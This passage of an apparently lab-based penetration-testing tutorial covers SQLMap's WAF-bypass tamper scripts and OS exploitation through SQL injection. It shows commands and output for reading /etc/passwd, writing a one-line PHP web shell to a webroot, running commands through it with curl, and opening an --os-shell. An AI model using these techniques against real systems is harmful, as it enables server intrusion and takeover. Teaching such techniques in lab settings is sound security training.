+<p>In case of a positive detection, to identify the actual protection mechanism, SQLMap uses a third-party library <a href="https://github.com/stamparm/identYwaf">identYwaf</a>, containing the signatures of 80 different WAF solutions. If we wanted to skip this heuristical test altogether (i.e., to produce less noise), we can use switch <code>--skip-waf</code>.</p>
+<hr>
+<h3 id="user-agent-blacklisting-bypass">User-agent Blacklisting Bypass</h3>
+<p>In case of immediate problems (e.g., HTTP error code 5XX from the start) while running SQLMap, one of the first things we should think of is the potential blacklisting of the default user-agent used by SQLMap (e.g. <code>User-agent: sqlmap/1.4.9 (http://sqlmap.org)</code>).</p>
+<p>This is trivial to bypass with the switch <code>--random-agent</code>, which changes the default user-agent with a randomly chosen value from a large pool of values used by browsers.</p>
+<p>Note: If some form of protection is detected during the run, we can expect problems with the target, even other security mechanisms. The main reason is the continuous development and new improvements in such protections, leaving smaller and smaller maneuver space for attackers.</p>
+<hr>
+<h3 id="tamper-scripts">Tamper Scripts</h3>
+<p>Finally, one of the most popular mechanisms implemented in SQLMap for bypassing WAF/IPS solutions is the so-called "tamper" scripts. Tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection.</p>
+<p>For example, one of the most popular tamper scripts <a href="https://github.com/sqlmapproject/sqlmap/blob/master/tamper/between.py">between</a> is replacing all occurrences of greater than operator (<code>&gt;</code>) with <code>NOT BETWEEN 0 AND #</code>, and the equals operator (<code>=</code>) with <code>BETWEEN # AND #</code>. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes.</p>
+<p>Tamper scripts can be chained, one after another, within the <code>--tamper</code> option (e.g. <code>--tamper=between,randomcase</code>), where they are run based on their predefined priority. A priority is predefined to prevent any unwanted behavior, as some scripts modify payloads by modifying their SQL syntax (e.g. <a href="https://github.com/sqlmapproject/sqlmap/blob/master/tamper/ifnull2ifisnull.py">ifnull2ifisnull</a>). In contrast, some tamper scripts do not care about the inner content (e.g. <a href="https://github.com/sqlmapproject/sqlmap/blob/master/tamper/appendnullbyte.py">appendnullbyte</a>).</p>
+<p>Tamper scripts can modify any part of the request, although the majority change the payload content. The most notable tamper scripts are the following:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Tamper-Script</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>0eunion</code></td>
+<td>Replaces instances of UNION with e0UNION</td>
+</tr>
+<tr>
+<td><code>base64encode</code></td>
+<td>Base64-encodes all characters in a given payload</td>
+</tr>
+<tr>
+<td><code>between</code></td>
+<td>Replaces greater than operator (<code>&gt;</code>) with <code>NOT BETWEEN 0 AND #</code> and equals operator (<code>=</code>) with <code>BETWEEN # AND #</code></td>
+</tr>
+<tr>
+<td><code>commalesslimit</code></td>
+<td>Replaces (MySQL) instances like <code>LIMIT M, N</code> with <code>LIMIT N OFFSET M</code> counterpart</td>
+</tr>
+<tr>
+<td><code>equaltolike</code></td>
+<td>Replaces all occurrences of operator equal (<code>=</code>) with <code>LIKE</code> counterpart</td>
+</tr>
+<tr>
+<td><code>halfversionedmorekeywords</code></td>
+<td>Adds (MySQL) versioned comment before each keyword</td>
+</tr>
+<tr>
+<td><code>modsecurityversioned</code></td>
+<td>Embraces complete query with (MySQL) versioned comment</td>
+</tr>
+<tr>
+<td><code>modsecurityzeroversioned</code></td>
+<td>Embraces complete query with (MySQL) zero-versioned comment</td>
+</tr>
+<tr>
+<td><code>percentage</code></td>
+<td>Adds a percentage sign (<code>%</code>) in front of each character (e.g. SELECT -&gt; %S%E%L%E%C%T)</td>
+</tr>
+<tr>
+<td><code>plus2concat</code></td>
+<td>Replaces plus operator (<code>+</code>) with (MsSQL) function CONCAT() counterpart</td>
+</tr>
+<tr>
+<td><code>randomcase</code></td>
+<td>Replaces each keyword character with random case value (e.g. SELECT -&gt; SEleCt)</td>
+</tr>
+<tr>
+<td><code>space2comment</code></td>
+<td>Replaces space character ( ) with comments `/</td>
+</tr>
+<tr>
+<td><code>space2dash</code></td>
+<td>Replaces space character ( ) with a dash comment (<code>--</code>) followed by a random string and a new line ()</td>
+</tr>
+<tr>
+<td><code>space2hash</code></td>
+<td>Replaces (MySQL) instances of space character ( ) with a pound character (<code>#</code>) followed by a random string and a new line ()</td>
+</tr>
+<tr>
+<td><code>space2mssqlblank</code></td>
+<td>Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters</td>
+</tr>
+<tr>
+<td><code>space2plus</code></td>
+<td>Replaces space character ( ) with plus (<code>+</code>)</td>
+</tr>
+<tr>
+<td><code>space2randomblank</code></td>
+<td>Replaces space character ( ) with a random blank character from a valid set of alternate characters</td>
+</tr>
+<tr>
+<td><code>symboliclogical</code></td>
+<td>Replaces AND and OR logical operators with their symbolic counterparts (<code>&amp;&amp;</code> and `\</td>
+<td>\</td>
+<td>`)</td>
+</tr>
+<tr>
+<td><code>versionedkeywords</code></td>
+<td>Encloses each non-function keyword with (MySQL) versioned comment</td>
+</tr>
+<tr>
+<td><code>versionedmorekeywords</code></td>
+<td>Encloses each keyword with (MySQL) versioned comment</td>
+</tr>
+</tbody>
+</table>
+<p>To get a whole list of implemented tamper scripts, along with the description as above, switch <code>--list-tampers</code> can be used. We can also develop custom Tamper scripts for any custom type of attack, like a second-order SQLi.</p>
+<hr>
+<h3 id="miscellaneous-bypasses">Miscellaneous Bypasses</h3>
+<p>Out of other protection bypass mechanisms, there are also two more that should be mentioned. The first one is the <code>Chunked</code> transfer encoding, turned on using the switch <code>--chunked</code>, which splits the POST request's body into so-called "chunks." Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.</p>
+<p>The other bypass mechanisms is the <code>HTTP parameter pollution</code> (<code>HPP</code>), where payloads are split in a similar way as in case of <code>--chunked</code> between different same parameter named values (e.g. <code>?id=1&amp;id=UNION&amp;id=SELECT&amp;id=username,password&amp;id=FROM&amp;id=users...</code>), which are concatenated by the target platform if supporting it (e.g. <code>ASP</code>).</p>
+<h2 id="os-exploitation">OS Exploitation</h2>
+<hr>
+<p>SQLMap has the ability to utilize an SQL Injection to read and write files from the local system outside the DBMS. SQLMap can also attempt to give us direct command execution on the remote host if we had the proper privileges.</p>
+<hr>
+<h3 id="file-read-write">File Read/Write</h3>
+<p>The first part of OS Exploitation through an SQL Injection vulnerability is reading and writing data on the hosting server. Reading data is much more common than writing data, which is strictly privileged in modern DBMSes, as it can lead to system exploitation, as we will see. For example, in MySql, to read local files, the DB user must have the privilege to <code>LOAD DATA</code> and <code>INSERT</code>, to be able to load the content of a file to a table and then reading that table.</p>
+<p>An example of such a command is:</p>
+<ul>
+<li><code>LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;</code></li>
+</ul>
+<p>While we do not necessarily need to have database administrator privileges (DBA) to read data, this is becoming more common in modern DBMSes. The same applies to other common databases. Still, if we do have DBA privileges, then it is much more probable that we have file-read privileges.</p>
+<hr>
+<h3 id="checking-for-dba-privileges">Checking for DBA Privileges</h3>
+<p>To check whether we have DBA privileges with SQLMap, we can use the <code>--is-dba</code> option:</p>
+<p>OS Exploitation</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> sqlmap -u <span class="hljs-string">"http://www.example.com/case1.php?id=1"</span> --is-dba
+
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.4.11<span class="hljs-comment">#stable}</span>
+|<span class="hljs-string">_ -</span>|<span class="hljs-string"> . [)]     </span>|<span class="hljs-string"> .'</span>|<span class="hljs-string"> . </span>|
+|<span class="hljs-string">___</span>|<span class="hljs-string">_  ["]_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">__,</span>|<span class="hljs-string">  _</span>|
+      |<span class="hljs-string">_</span>|<span class="hljs-string">V...       </span>|<span class="hljs-string">_</span>|<span class="hljs-string">   http://sqlmap.org
+
+[*] starting @ 17:31:55 /2020-11-19/
+
+[17:31:55] [INFO] resuming back-end DBMS 'mysql'
+[17:31:55] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+current user is DBA: False
+
+[*] ending @ 17:31:56 /2020-11-19</span>
+</code></pre>
+<p>As we can see, if we test that on one of the previous exercises, we get <code>current user is DBA: False</code>, meaning that we do not have DBA access. If we tried to read a file using SQLMap, we would get something like:</p>
+<p>OS Exploitation</p>
+<pre><code class="lang-shell-session">[<span class="hljs-name">17:31:43</span>] [<span class="hljs-name">INFO</span>] fetching file: <span class="hljs-symbol">'/etc/passwd</span>'
+[<span class="hljs-name">17:31:43</span>] [<span class="hljs-name">ERROR</span>] no data retrieved
+</code></pre>
+<p>To test OS exploitation, let's try an exercise in which we do have DBA privileges, as seen in the questions at the end of this section:</p>
+<p>OS Exploitation</p>
+<pre><code class="lang-shell-session">root@htb<span class="hljs-comment">[/htb]</span>$ sqlmap -u <span class="hljs-string">"http://www.example.com/?id=1"</span> --<span class="hljs-keyword">is</span>-dba
+
+        ___
+       __H__
+ ___ ___<span class="hljs-comment">["]</span>_____ ___ ___  {1.4.11#stable}
+|_ -| . <span class="hljs-comment">[']</span>     | .'| . |
+|___|_  <span class="hljs-comment">["]</span>_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+<span class="hljs-comment">[*]</span> starting @ 17:37:47 /2020-11-19/
+
+<span class="hljs-comment">[17:37:47]</span> <span class="hljs-comment">[INFO]</span> resuming back-end DBMS 'mysql'
+<span class="hljs-comment">[17:37:47]</span> <span class="hljs-comment">[INFO]</span> testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+current user <span class="hljs-keyword">is</span> DBA: True
+
+<span class="hljs-comment">[*]</span> ending @ 17:37:48 /2020-11-19/
+</code></pre>
+<p>We see that this time we get <code>current user is DBA: True</code>, meaning that we may have the privilege to read local files.</p>
+<hr>
+<h3 id="reading-local-files">Reading Local Files</h3>
+<p>Instead of manually injecting the above line through SQLi, SQLMap makes it relatively easy to read local files with the <code>--file-read</code> option:</p>
+<p>OS Exploitation</p>
+<pre><code class="lang-shell-session">root@htb<span class="hljs-comment">[/htb]</span>$ sqlmap -u <span class="hljs-string">"http://www.example.com/?id=1"</span> --file-read <span class="hljs-string">"/etc/passwd"</span>
+
+        ___
+       __H__
+ ___ ___<span class="hljs-comment">[)]</span>_____ ___ ___  {1.4.11#stable}
+|_ -| . <span class="hljs-comment">[)]</span>     | .'| . |
+|___|_  <span class="hljs-comment">[)]</span>_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+<span class="hljs-comment">[*]</span> starting @ 17:40:00 /2020-11-19/
+
+<span class="hljs-comment">[17:40:00]</span> <span class="hljs-comment">[INFO]</span> resuming back-end DBMS 'mysql'
+<span class="hljs-comment">[17:40:00]</span> <span class="hljs-comment">[INFO]</span> testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+<span class="hljs-comment">[17:40:01]</span> <span class="hljs-comment">[INFO]</span> fetching file: '/etc/passwd'
+<span class="hljs-comment">[17:40:01]</span> <span class="hljs-comment">[WARNING]</span> time-based comparison requires larger statistical model, please wait............................. (done)
+<span class="hljs-comment">[17:40:07]</span> <span class="hljs-comment">[WARNING]</span> in case <span class="hljs-keyword">of</span> continuous data retrieval problems you <span class="hljs-keyword">are</span> advised to try a switch '--no-cast' or switch '--hex'
+<span class="hljs-comment">[17:40:07]</span> <span class="hljs-comment">[WARNING]</span> unable to retrieve the content <span class="hljs-keyword">of</span> the file '/etc/passwd', going to fall-back to simpler UNION technique
+<span class="hljs-comment">[17:40:07]</span> <span class="hljs-comment">[INFO]</span> fetching file: '/etc/passwd'
+do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? <span class="hljs-comment">[Y/n]</span> y
+
+<span class="hljs-comment">[17:40:14]</span> <span class="hljs-comment">[INFO]</span> the local file '~/.sqlmap/output/www.example.com/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (982 B)
+files saved to <span class="hljs-comment">[1]</span>:
+<span class="hljs-comment">[*]</span> ~/.sqlmap/output/www.example.com/files/_etc_passwd (same file)
+
+<span class="hljs-comment">[*]</span> ending @ 17:40:14 /2020-11-19/
+</code></pre>
+<p>As we can see, SQLMap said <code>files saved</code> to a local file. We can <code>cat</code> the local file to see its content:</p>
+<p>OS Exploitation</p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ cat ~/</span>.sqlmap/output/www.example.com/files/_etc_passwd
+
+<span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span>
+<span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+...SNIP...
+</code></pre>
+<p>We have successfully retrieved the remote file.</p>
+<hr>
+<h3 id="writing-local-files">Writing Local Files</h3>
+<p>When it comes to writing files to the hosting server, it becomes much more restricted in modern DMBSes, since we can utilize this to write a Web Shell on the remote server, and hence get code execution and take over the server.</p>
+<p>This is why modern DBMSes disable file-write by default and need certain privileges for DBA's to be able to write files. For example, in MySql, the <code>--secure-file-priv</code> configuration must be manually disabled to allow writing data into local files using the <code>INTO OUTFILE</code> SQL query, in addition to any local access needed on the host server, like the privilege to write in the directory we need.</p>
+<p>Still, many web applications require the ability for DBMSes to write data into files, so it is worth testing whether we can write files to the remote server. To do that with SQLMap, we can use the <code>--file-write</code> and <code>--file-dest</code> options. First, let's prepare a basic PHP web shell and write it into a <code>shell.php</code> file:</p>
+<p>OS Exploitation</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ echo '<span class="php"><span class="hljs-meta">&lt;?php</span> system($_GET[<span class="hljs-string">"cmd"</span>]); <span class="hljs-meta">?&gt;</span></span>' &gt; shell.php
+</code></pre>
+<p>Now, let's attempt to write this file on the remote server, in the <code>/var/www/html/</code> directory, the default server webroot for Apache. If we didn't know the server webroot, we will see how SQLMap can automatically find it.</p>
+<p>OS Exploitation</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> sqlmap -u <span class="hljs-string">"http://www.example.com/?id=1"</span> --file-write <span class="hljs-string">"shell.php"</span> --file-dest <span class="hljs-string">"/var/www/html/shell.php"</span>
+
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.4.11<span class="hljs-comment">#stable}</span>
+|<span class="hljs-string">_ -</span>|<span class="hljs-string"> . [(]     </span>|<span class="hljs-string"> .'</span>|<span class="hljs-string"> . </span>|
+|<span class="hljs-string">___</span>|<span class="hljs-string">_  [,]_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">__,</span>|<span class="hljs-string">  _</span>|
+      |<span class="hljs-string">_</span>|<span class="hljs-string">V...       </span>|<span class="hljs-string">_</span>|<span class="hljs-string">   http://sqlmap.org
+
+
+[*] starting @ 17:54:18 /2020-11-19/
+
+[17:54:19] [INFO] resuming back-end DBMS 'mysql'
+[17:54:19] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+do you want confirmation that the local file 'shell.php' has been successfully written on the back-end DBMS file system ('/var/www/html/shell.php')? [Y/n] y
+
+[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)
+
+[*] ending @ 17:54:28 /2020-11-19/</span>
+</code></pre>
+<p>We see that SQLMap confirmed that the file was indeed written:</p>
+<p>OS Exploitation</p>
+<pre><code class="lang-shell-session">[<span class="hljs-name">17:54:28</span>] [<span class="hljs-name">INFO</span>] the local file <span class="hljs-symbol">'shell.php</span>' and the remote file <span class="hljs-symbol">'/var/www/html/shell.php</span>' have the same size (<span class="hljs-name">31</span> B)
+</code></pre>
+<p>Now, we can attempt to access the remote PHP shell, and execute a sample command:</p>
+<p>OS Exploitation</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl http://www.example.com/shell.php?cmd=ls+-la
+
+total 148
+drwxrwxrwt<span class="hljs-number"> 1 </span>www-data www-data  <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 19 </span>17:54 .
+drwxr-xr-x<span class="hljs-number"> 1 </span>www-data www-data  <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 19 </span>08:15 ..
+-rw-rw-rw-<span class="hljs-number"> 1 </span>mysql    mysql      <span class="hljs-number"> 188 </span>Nov<span class="hljs-number"> 19 </span>07:39 basic.php
+...SNIP...
+</code></pre>
+<p>We see that our PHP shell was indeed written on the remote server, and that we do have command execution over the host server.</p>
+<hr>
+<h3 id="os-command-execution">OS Command Execution</h3>
+<p>Now that we confirmed that we could write a PHP shell to get command execution, we can test SQLMap's ability to give us an easy OS shell without manually writing a remote shell. SQLMap utilizes various techniques to get a remote shell through SQL injection vulnerabilities, like writing a remote shell, as we just did, writing SQL functions that execute commands and retrieve output or even using some SQL queries that directly execute OS command, like <code>xp_cmdshell</code> in Microsoft SQL Server. To get an OS shell with SQLMap, we can use the <code>--os-shell</code> option, as follows:</p>
+<p>OS Exploitation</p>
+<pre><code class="lang-shell-session">root@htb<span class="hljs-comment">[/htb]</span>$ sqlmap -u <span class="hljs-string">"http://www.example.com/?id=1"</span> --os-shell
+
+        ___
+       __H__
+ ___ ___<span class="hljs-comment">[.]</span>_____ ___ ___  {1.4.11#stable}
+|_ -| . <span class="hljs-comment">[)]</span>     | .'| . |
+|___|_  <span class="hljs-comment">["]</span>_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+<span class="hljs-comment">[*]</span> starting @ 18:02:15 /2020-11-19/
+
+<span class="hljs-comment">[18:02:16]</span> <span class="hljs-comment">[INFO]</span> resuming back-end DBMS 'mysql'
+<span class="hljs-comment">[18:02:16]</span> <span class="hljs-comment">[INFO]</span> testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+<span class="hljs-comment">[18:02:37]</span> <span class="hljs-comment">[INFO]</span> the local file '/tmp/sqlmapmswx18kp12261/lib_mysqludf_sys8kj7u1jp.so' and the remote file './libslpjs.so' have the same size (8040 B)
+<span class="hljs-comment">[18:02:37]</span> <span class="hljs-comment">[INFO]</span> creating UDF 'sys_exec' from the binary UDF file
+<span class="hljs-comment">[18:02:38]</span> <span class="hljs-comment">[INFO]</span> creating UDF 'sys_eval' from the binary UDF file
+<span class="hljs-comment">[18:02:39]</span> <span class="hljs-comment">[INFO]</span> going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
+<span class="hljs-comment">[18:02:39]</span> <span class="hljs-comment">[INFO]</span> calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
+
+os-shell&gt; ls -la
+do you want to retrieve the command standard output? <span class="hljs-comment">[Y/n/a]</span> a
+
+<span class="hljs-comment">[18:02:45]</span> <span class="hljs-comment">[WARNING]</span> something went wrong with full UNION technique (could be because <span class="hljs-keyword">of</span> limitation on retrieved number <span class="hljs-keyword">of</span> entries). Falling back to partial UNION technique
+No output
+</code></pre>
+<p>We see that SQLMap defaulted to <code>UNION</code> technique to get an OS shell, but eventually failed to give us any output <code>No output</code>. So, as we already know we have multiple types of SQL injection vulnerabilities, let's try to specify another technique that has a better chance of giving us direct output, like the <code>Error-based SQL Injection</code>, which we can specify with <code>--technique=E</code>:</p>
+<p>OS Exploitation</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sqlmap -<span class="hljs-keyword">u</span> <span class="hljs-string">"http://www.example.com/?id=1"</span> --os-<span class="hljs-keyword">shell</span> --technique=<span class="hljs-built_in">E</span>
+
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.11#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http:<span class="hljs-comment">//sqlmap.org</span>
+
+
+[*] starting @ 18:05:59 /2020-11-19/
+
+[18:05:59] [INFO] resuming back-end DBMS 'mysql'
+[18:05:59] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+<span class="hljs-keyword">which</span> web application language does the web server support?
+[1] ASP
+[2] ASPX
+[3] JSP
+[4] PHP (default)
+&gt; 4
+
+<span class="hljs-keyword">do</span> you want sqlmap to further try to provoke the full path disclosure? [Y/<span class="hljs-keyword">n</span>] <span class="hljs-built_in">y</span>
+
+[18:06:07] [WARNING] unable to automatically retrieve the web server document root
+what <span class="hljs-keyword">do</span> you want to <span class="hljs-keyword">use</span> <span class="hljs-keyword">for</span> writable directory?
+[1] common location(s) ('/<span class="hljs-keyword">var</span>/www/, /<span class="hljs-keyword">var</span>/www/html, /<span class="hljs-keyword">var</span>/www/htdocs, /usr/<span class="hljs-keyword">local</span>/apache2/htdocs, /usr/<span class="hljs-keyword">local</span>/www/data, /<span class="hljs-keyword">var</span>/apache2/htdocs, /<span class="hljs-keyword">var</span>/www/nginx-default, /srv/www/htdocs') (default)
+[2] custom location(s)
+[3] custom directory <span class="hljs-keyword">list</span> <span class="hljs-keyword">file</span>
+[4] brute force <span class="hljs-keyword">search</span>
+&gt; 1
+
+[18:06:09] [WARNING] unable to automatically <span class="hljs-keyword">parse</span> any web server path
+[18:06:09] [INFO] trying to upload the <span class="hljs-keyword">file</span> stager <span class="hljs-keyword">on</span> '/<span class="hljs-keyword">var</span>/www/' via LIMIT 'LINES TERMINATED <span class="hljs-keyword">BY</span>' method
+[18:06:09] [WARNING] potential permission problems detected ('Permission denied')
+[18:06:10] [WARNING] unable to upload the <span class="hljs-keyword">file</span> stager <span class="hljs-keyword">on</span> '/<span class="hljs-keyword">var</span>/www/'
+[18:06:10] [INFO] trying to upload the <span class="hljs-keyword">file</span> stager <span class="hljs-keyword">on</span> '/<span class="hljs-keyword">var</span>/www/html/' via LIMIT 'LINES TERMINATED <span class="hljs-keyword">BY</span>' method
+[18:06:11] [INFO] the <span class="hljs-keyword">file</span> stager has been successfully uploaded <span class="hljs-keyword">on</span> '/<span class="hljs-keyword">var</span>/www/html/' - http:<span class="hljs-comment">//www.example.com/tmpumgzr.php</span>
+[18:06:11] [INFO] the backdoor has been successfully uploaded <span class="hljs-keyword">on</span> '/<span class="hljs-keyword">var</span>/www/html/' - http:<span class="hljs-comment">//www.example.com/tmpbznbe.php</span>
+[18:06:11] [INFO] calling OS <span class="hljs-keyword">shell</span>. To quit <span class="hljs-keyword">type</span> 'x' or 'q' and press ENTER
+
+os-<span class="hljs-keyword">shell</span>&gt; <span class="hljs-keyword">ls</span> -<span class="hljs-keyword">la</span>
+
+<span class="hljs-keyword">do</span> you want to retrieve the command standard output? [Y/<span class="hljs-keyword">n</span>/a] a
+
+command standard output:
+---
+<span class="hljs-keyword">total</span> 156
+drwxrwxrwt 1 www-data www-data   4096 Nov 19 18:06 .
+drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
+-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
+...SNIP...
+</code></pre>
+<p>As we can see, this time SQLMap successfully dropped us into an easy interactive remote shell, giving us easy remote code execution through this SQLi.</p>
+<p>Note: SQLMap first asked us for the type of language used on this remote server, which we know is PHP. Then it asked us for the server web root directory, and we asked SQLMap to automatically find it using 'common location(s)'. Both of these options are the default options, and would have been automatically chosen if we added the '--batch' option to SQLMap.</p>
+<p>With this, we have covered all of the main functionality of SQLMap.</p>
+</div></body></html>
